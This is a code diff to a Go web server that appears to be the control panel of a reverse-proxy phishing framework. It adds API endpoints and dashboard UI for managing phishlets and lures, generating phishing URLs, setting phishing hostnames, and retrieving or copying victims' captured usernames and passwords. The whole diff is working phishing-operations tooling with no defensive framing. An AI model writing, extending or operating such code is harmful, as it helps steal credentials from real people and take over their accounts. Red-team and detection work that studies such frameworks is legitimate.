@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"net/http"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -115,6 +116,17 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	router.HandleFunc("/api/sessions/{id}", ws.handleAPISessionDetails).Methods("GET")
 	router.HandleFunc("/api/stats", ws.handleAPIStats).Methods("GET")
 	router.HandleFunc("/api/phishlets", ws.handleAPIPhishlets).Methods("GET")
+	router.HandleFunc("/api/phishlets/{name}/enable", ws.handleAPIPhishletEnable).Methods("POST")
+	router.HandleFunc("/api/phishlets/{name}/disable", ws.handleAPIPhishletDisable).Methods("POST")
+	router.HandleFunc("/api/phishlets/{name}/hostname", ws.handleAPIPhishletHostname).Methods("POST")
+	router.HandleFunc("/api/phishlets/{name}/credentials", ws.handleAPIPhishletCredentials).Methods("GET")
+	
+	// Lures API routes
+	router.HandleFunc("/api/lures", ws.handleAPILures).Methods("GET")
+	router.HandleFunc("/api/lures", ws.handleAPICreateLure).Methods("POST")
+	router.HandleFunc("/api/lures/{id}", ws.handleAPIUpdateLure).Methods("PUT")
+	router.HandleFunc("/api/lures/{id}", ws.handleAPIDeleteLure).Methods("DELETE")
+	router.HandleFunc("/api/lures/{id}/url", ws.handleAPILureGetURL).Methods("GET")
 	
 	// Authentication routes
 	router.HandleFunc("/api/auth/status", ws.handleAuthStatus).Methods("GET")
@@ -521,6 +533,20 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             margin-bottom: 10px;
         }
 
+        .phishlet-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .phishlet-actions .btn {
+            padding: 8px 12px;
+            font-size: 14px;
+            flex: 1;
+            min-width: 80px;
+        }
+
         .auto-refresh {
             position: fixed;
             bottom: 20px;
@@ -648,6 +674,14 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
         <div class="sessions-section">
             <h2 class="section-title">🎯 Phishlets</h2>
             <div id="phishlets-content" class="loading">Loading phishlets...</div>
+        </div>
+
+        <div class="sessions-section">
+            <h2 class="section-title">🎣 Lures</h2>
+            <div style="margin-bottom: 20px;">
+                <button class="btn btn-primary" onclick="showCreateLureModal()">➕ Create New Lure</button>
+            </div>
+            <div id="lures-content" class="loading">Loading lures...</div>
         </div>
     </div>
 
@@ -969,15 +1003,17 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 
             async loadInitialData() {
                 try {
-                    const [sessionsData, statsData, phishletsData] = await Promise.all([
+                    const [sessionsData, statsData, phishletsData, luresData] = await Promise.all([
                         fetch('/api/sessions').then(r => r.json()),
                         fetch('/api/stats').then(r => r.json()),
-                        fetch('/api/phishlets').then(r => r.json())
+                        fetch('/api/phishlets').then(r => r.json()),
+                        fetch('/api/lures', { headers: { 'Authorization': authManager.token } }).then(r => r.json())
                     ]);
 
                     this.updateSessionsTable(sessionsData);
                     this.updateStats(statsData);
                     this.updatePhishlets(phishletsData);
+                    this.updateLures(luresData);
                 } catch (error) {
                     console.error('Error loading initial data:', error);
                 }
@@ -1009,6 +1045,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                                 <th>Status</th>
                                 <th>IP Address</th>
                                 <th>Time</th>
+                                <th>Actions</th>
                             </tr>
                         </thead>
                         <tbody>
@@ -1025,6 +1062,12 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                                     </td>
                                     <td>${session.remote_addr}</td>
                                     <td>${new Date(session.update_time * 1000).toLocaleString()}</td>
+                                    <td>
+                                        ${session.username && session.password ? 
+                                            `<button class="btn btn-secondary" onclick="copySessionCredentials('${session.username}', '${session.password}')">📋 Copy</button>` : 
+                                            '-'
+                                        }
+                                    </td>
                                 </tr>
                             ` + "`" + `).join('')}
                         </tbody>
@@ -1061,12 +1104,62 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                                     <span>Visible:</span>
                                     <span>${phishlet.visible ? 'Yes' : 'No'}</span>
                                 </div>
+                                <div class="phishlet-actions">
+                                    <button class="btn ${phishlet.enabled ? 'btn-secondary' : 'btn-primary'}" 
+                                            onclick="togglePhishlet('${phishlet.name}', ${phishlet.enabled})">
+                                        ${phishlet.enabled ? '🔴 Disable' : '🟢 Enable'}
+                                    </button>
+                                    <button class="btn btn-secondary" onclick="copyCredentials('${phishlet.name}')">📋 Copy</button>
+                                    <button class="btn btn-secondary" onclick="setPhishletHostname('${phishlet.name}')">🏠 Set Hostname</button>
+                                </div>
                             </div>
                         ` + "`" + `).join('')}
                     </div>
                 ` + "`" + `;
 
                 contentEl.innerHTML = phishletsHTML;
+            }
+
+            updateLures(lures) {
+                const contentEl = document.getElementById('lures-content');
+                
+                if (!lures || lures.length === 0) {
+                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No lures found</p>';
+                    return;
+                }
+
+                const luresHTML = ` + "`" + `
+                    <div class="phishlets-grid">
+                        ${lures.map((lure, index) => ` + "`" + `
+                            <div class="phishlet-card">
+                                <div class="phishlet-name">Lure #${index}</div>
+                                <div class="phishlet-status">
+                                    <span>Phishlet:</span>
+                                    <span>${lure.phishlet}</span>
+                                </div>
+                                <div class="phishlet-status">
+                                    <span>Path:</span>
+                                    <span>${lure.path}</span>
+                                </div>
+                                <div class="phishlet-status">
+                                    <span>Hostname:</span>
+                                    <span>${lure.hostname || 'Default'}</span>
+                                </div>
+                                <div class="phishlet-status">
+                                    <span>Redirect URL:</span>
+                                    <span>${lure.redirect_url || 'None'}</span>
+                                </div>
+                                <div class="phishlet-actions">
+                                    <button class="btn btn-primary" onclick="getLureURL(${index})">🔗 Get URL</button>
+                                    <button class="btn btn-secondary" onclick="editLure(${index})">✏️ Edit</button>
+                                    <button class="btn btn-secondary" onclick="deleteLure(${index})">🗑️ Delete</button>
+                                </div>
+                            </div>
+                        ` + "`" + `).join('')}
+                    </div>
+                ` + "`" + `;
+
+                contentEl.innerHTML = luresHTML;
             }
 
             getSessionStatus(session) {
@@ -1091,6 +1184,204 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 
                 // Refresh the sessions table
                 this.loadInitialData();
+            }
+
+            async copyCredentials(phishletName) {
+                try {
+                    const response = await fetch(`/api/phishlets/${phishletName}/credentials`, {
+                        headers: { 'Authorization': authManager.token }
+                    });
+                    const data = await response.json();
+                    if (data.success) {
+                        navigator.clipboard.writeText(data.credentials).then(() => {
+                            alert('Credentials copied to clipboard!');
+                        }).catch(err => {
+                            console.error('Failed to copy credentials to clipboard:', err);
+                            alert('Credentials copied! (manual copy required)');
+                        });
+                    } else {
+                        alert('Failed to get credentials: ' + data.message);
+                    }
+                } catch (error) {
+                    console.error('Error copying credentials:', error);
+                    alert('Failed to copy credentials. Please try again.');
+                }
+            }
+
+            async togglePhishlet(phishletName, isEnabled) {
+                try {
+                    const endpoint = isEnabled ? 'disable' : 'enable';
+                    const response = await fetch(`/api/phishlets/${phishletName}/${endpoint}`, {
+                        method: 'POST',
+                        headers: { 'Authorization': authManager.token }
+                    });
+                    const data = await response.json();
+                    if (data.success) {
+                        alert(`Phishlet ${phishletName} ${isEnabled ? 'disabled' : 'enabled'} successfully!`);
+                        this.loadInitialData(); // Refresh the phishlets list
+                    } else {
+                        alert('Failed to update phishlet: ' + data.message);
+                    }
+                } catch (error) {
+                    console.error('Error updating phishlet:', error);
+                    alert('Failed to update phishlet. Please try again.');
+                }
+            }
+
+            async setPhishletHostname(phishletName) {
+                const hostname = prompt(`Set hostname for ${phishletName}:`, '');
+                if (hostname === null) return; // User cancelled
+                
+                try {
+                    const response = await fetch(`/api/phishlets/${phishletName}/hostname`, {
+                        method: 'POST',
+                        headers: { 
+                            'Authorization': authManager.token,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ hostname: hostname })
+                    });
+                    const data = await response.json();
+                    if (data.success) {
+                        alert(`Hostname set for ${phishletName}!`);
+                        this.loadInitialData(); // Refresh the phishlets list
+                    } else {
+                        alert('Failed to set hostname: ' + data.message);
+                    }
+                } catch (error) {
+                    console.error('Error setting hostname:', error);
+                    alert('Failed to set hostname. Please try again.');
+                }
+            }
+        }
+
+        // Global functions for phishlet management
+        function copyCredentials(phishletName) {
+            if (window.dashboard) {
+                window.dashboard.copyCredentials(phishletName);
+            }
+        }
+
+        function togglePhishlet(phishletName, isEnabled) {
+            if (window.dashboard) {
+                window.dashboard.togglePhishlet(phishletName, isEnabled);
+            }
+        }
+
+        function setPhishletHostname(phishletName) {
+            if (window.dashboard) {
+                window.dashboard.setPhishletHostname(phishletName);
+            }
+        }
+
+        // Global function for copying session credentials
+        function copySessionCredentials(username, password) {
+            const credentials = `Username: ${username}\nPassword: ${password}`;
+            navigator.clipboard.writeText(credentials).then(() => {
+                alert('Session credentials copied to clipboard!');
+            }).catch(err => {
+                alert('Credentials:\n\n' + credentials);
+            });
+        }
+
+        // Global functions for lure management
+        function showCreateLureModal() {
+            const phishlet = prompt('Enter phishlet name:');
+            if (phishlet) {
+                createLure(phishlet);
+            }
+        }
+
+        async function createLure(phishletName) {
+            try {
+                const response = await fetch('/api/lures', {
+                    method: 'POST',
+                    headers: { 
+                        'Authorization': authManager.token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phishlet: phishletName })
+                });
+                const data = await response.json();
+                if (response.ok) {
+                    alert('Lure created successfully!');
+                    window.dashboard.loadInitialData();
+                } else {
+                    alert('Failed to create lure: ' + (data.message || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error creating lure:', error);
+                alert('Failed to create lure. Please try again.');
+            }
+        }
+
+        async function getLureURL(lureId) {
+            try {
+                const response = await fetch(`/api/lures/${lureId}/url`, {
+                    headers: { 'Authorization': authManager.token }
+                });
+                const data = await response.json();
+                if (response.ok) {
+                    navigator.clipboard.writeText(data.url).then(() => {
+                        alert('Lure URL copied to clipboard!\\n\\n' + data.url);
+                    }).catch(err => {
+                        alert('Lure URL:\\n\\n' + data.url);
+                    });
+                } else {
+                    alert('Failed to get lure URL: ' + (data.message || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error getting lure URL:', error);
+                alert('Failed to get lure URL. Please try again.');
+            }
+        }
+
+        async function editLure(lureId) {
+            const hostname = prompt('Enter new hostname (leave empty for default):');
+            const redirectUrl = prompt('Enter redirect URL (leave empty for none):');
+            
+            try {
+                const response = await fetch(`/api/lures/${lureId}`, {
+                    method: 'PUT',
+                    headers: { 
+                        'Authorization': authManager.token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        hostname: hostname || '',
+                        redirect_url: redirectUrl || ''
+                    })
+                });
+                const data = await response.json();
+                if (response.ok) {
+                    alert('Lure updated successfully!');
+                    window.dashboard.loadInitialData();
+                } else {
+                    alert('Failed to update lure: ' + (data.message || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error updating lure:', error);
+                alert('Failed to update lure. Please try again.');
+            }
+        }
+
+        async function deleteLure(lureId) {
+            if (confirm('Are you sure you want to delete this lure?')) {
+                try {
+                    const response = await fetch(`/api/lures/${lureId}`, {
+                        method: 'DELETE',
+                        headers: { 'Authorization': authManager.token }
+                    });
+                    if (response.ok) {
+                        alert('Lure deleted successfully!');
+                        window.dashboard.loadInitialData();
+                    } else {
+                        alert('Failed to delete lure');
+                    }
+                } catch (error) {
+                    console.error('Error deleting lure:', error);
+                    alert('Failed to delete lure. Please try again.');
+                }
             }
         }
 
@@ -1193,6 +1484,330 @@ func (ws *WebServer) handleAPIPhishlets(w http.ResponseWriter, r *http.Request) 
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(phishlets)
+}
+
+func (ws *WebServer) handleAPIPhishletEnable(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	if ok := ws.cfg.SetSiteEnabled(name); !ok {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to enable phishlet",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	response := AuthResponse{
+		Success: true,
+		Message: "Phishlet enabled",
+	}
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPIPhishletDisable(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	if ok := ws.cfg.SetSiteDisabled(name); !ok {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to disable phishlet",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	response := AuthResponse{
+		Success: true,
+		Message: "Phishlet disabled",
+	}
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPIPhishletHostname(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	var req struct {
+		Hostname string `json:"hostname"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid request",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	if ok := ws.cfg.SetSiteHostname(name, req.Hostname); !ok {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to set hostname",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	response := AuthResponse{
+		Success: true,
+		Message: "Hostname set",
+	}
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPIPhishletCredentials(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Get all sessions for this phishlet
+	sessions, err := ws.db.ListSessions()
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to get sessions",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	var credentials []string
+	for _, session := range sessions {
+		if session.Phishlet == name {
+			if session.Username != "" && session.Password != "" {
+				credentials = append(credentials, fmt.Sprintf("Username: %s, Password: %s", session.Username, session.Password))
+			}
+		}
+	}
+
+	if len(credentials) == 0 {
+		response := AuthResponse{
+			Success: false,
+			Message: "No credentials found for this phishlet",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	credentialsText := strings.Join(credentials, "\n")
+	response := map[string]interface{}{
+		"success": true,
+		"credentials": credentialsText,
+		"message": "Credentials retrieved",
+	}
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPILures(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	lures := ws.cfg.lures
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(lures)
+}
+
+func (ws *WebServer) handleAPICreateLure(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	var lure Lure
+	if err := json.NewDecoder(r.Body).Decode(&lure); err != nil {
+		http.Error(w, "Invalid lure data", http.StatusBadRequest)
+		return
+	}
+
+	// Generate a random path if not provided
+	if lure.Path == "" {
+		lure.Path = "/" + GenRandomString(8)
+	}
+
+	ws.cfg.AddLure(lure.Phishlet, &lure)
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(lure)
+}
+
+func (ws *WebServer) handleAPIUpdateLure(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	vars := mux.Vars(r)
+	id, err := strconv.Atoi(vars["id"])
+	if err != nil {
+		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
+		return
+	}
+
+	var lure Lure
+	if err := json.NewDecoder(r.Body).Decode(&lure); err != nil {
+		http.Error(w, "Invalid lure data", http.StatusBadRequest)
+		return
+	}
+
+	if err := ws.cfg.SetLure(id, &lure); err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(lure)
+}
+
+func (ws *WebServer) handleAPIDeleteLure(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	vars := mux.Vars(r)
+	id, err := strconv.Atoi(vars["id"])
+	if err != nil {
+		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
+		return
+	}
+
+	if err := ws.cfg.DeleteLure(id); err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.WriteHeader(http.StatusNoContent)
+}
+
+func (ws *WebServer) handleAPILureGetURL(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	vars := mux.Vars(r)
+	id, err := strconv.Atoi(vars["id"])
+	if err != nil {
+		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
+		return
+	}
+
+	lure, err := ws.cfg.GetLure(id)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusNotFound)
+		return
+	}
+
+	// Generate the phishing URL
+	pl, err := ws.cfg.GetPhishlet(lure.Phishlet)
+	if err != nil {
+		http.Error(w, "Phishlet not found", http.StatusNotFound)
+		return
+	}
+
+	var phishURL string
+	if lure.Hostname != "" {
+		phishURL = "https://" + lure.Hostname + lure.Path
+	} else {
+		bhost, ok := ws.cfg.GetSiteDomain(pl.Name)
+		if !ok || len(bhost) == 0 {
+			http.Error(w, "No hostname set for phishlet", http.StatusBadRequest)
+			return
+		}
+		purl, err := pl.GetLureUrl(lure.Path)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		phishURL = purl
+	}
+
+	response := map[string]interface{}{
+		"lure": lure,
+		"url":  phishURL,
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) handleWebSocket(w http.ResponseWriter, r *http.Request) {
